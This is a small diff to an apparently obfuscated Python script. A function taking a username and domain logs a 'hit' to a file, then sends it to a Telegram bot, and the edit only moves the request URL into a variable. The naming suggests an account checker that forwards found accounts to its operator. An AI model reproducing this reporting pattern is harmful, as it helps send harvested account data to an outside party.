@@ -343,7 +343,8 @@ def A9(username, domain):
     with W("Sthits.txt", "a") as M_file:
         M_file.write(H_msg + "\n")
     try:
-        A.get(f"https://api.telegram.org/bot{q}/sendMessage?chat_id={p}&text={H_msg}")
+        url=f"https://api.telegram.org/bot{q}/sendMessage?chat_id={p}&text={H_msg}"
+        A.get(url)
     except F:
         pass
 
